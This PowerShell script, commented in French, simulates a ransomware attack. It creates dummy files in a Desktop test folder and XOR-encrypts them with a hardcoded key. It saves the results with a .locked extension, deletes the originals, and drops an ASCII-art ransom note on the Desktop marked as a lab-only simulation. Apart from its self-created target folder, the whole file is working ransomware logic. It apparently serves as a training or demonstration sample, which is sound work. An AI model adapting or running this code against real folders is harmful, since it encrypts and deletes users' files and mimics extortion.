# Dossier cible
$TARGET = "$env:USERPROFILE\Desktop\test_ransomware"
$DESKTOP = "$env:USERPROFILE\Desktop"
$KEY = [System.Text.Encoding]::UTF8.GetBytes("SimulationKey123")

# Créer le dossier et fichiers bidons si inexistant
if (!(Test-Path $TARGET)) {
    New-Item -ItemType Directory -Path $TARGET | Out-Null
    for ($i = 0; $i -lt 5; $i++) {
        Set-Content "$TARGET\file$i.txt" "Fichier important $i - donnees confidentielles"
    }
}

# Fonction XOR
function XOR-Encrypt($data, $key) {
    $result = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $result[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
    return $result
}

# Chiffrer les fichiers
Get-ChildItem -Path $TARGET -Recurse -File | Where-Object { $_.Extension -ne ".locked" } | ForEach-Object {
    $data = [System.IO.File]::ReadAllBytes($_.FullName)
    $encrypted = XOR-Encrypt $data $KEY
    [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $encrypted)
    Remove-Item $_.FullName
}

# Note de rançon sur le Desktop directement
$note = @"
    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
    ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
    ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║

    Vos fichiers ont ete chiffres !

    Pour les recuperer : simulation-lab@test.com
    Cle de dechiffrement : SIMULATION-LAB-2026

    !! CECI EST UNE SIMULATION - LAB ONLY !!
"@

# Note dans le dossier ET sur le Desktop
Set-Content "$TARGET\README_DECRYPT.txt" $note
Set-Content "$DESKTOP\README_DECRYPT.txt" $note

Write-Host "[+] Chiffrement termine !"
Write-Host "[+] Fichiers chiffres dans : $TARGET"
Write-Host "[+] Note de rancon deposee sur le Desktop"
